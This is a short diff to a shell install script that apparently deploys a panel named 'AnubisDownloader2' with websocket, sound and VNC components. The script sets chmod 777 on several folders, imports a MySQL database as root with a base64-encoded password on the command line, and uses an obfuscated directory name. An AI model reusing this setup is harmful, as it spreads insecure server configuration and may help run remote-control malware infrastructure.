@@ -22,11 +22,11 @@ mv AnubisDownloader2 html
 chmod 777 html
 cd html
 mv phpmyadmin /var/www/htmlphpmyadmin
-cd /
+cd /var/www
 chmod 777 htmlphpmyadmin
 cd /var/www/html
 mysql -u root -p YW51YmlzZGI < database.sql
-cd c2Zkc2RmYXNkYXNzZGE\application\
+cd /c2Zkc2RmYXNkYXNzZGE/application/
 chmod 777 websocket\*.*
 chmod 777 websocket\sound\*.*
 chmod 777 websocket\VNC\*.*
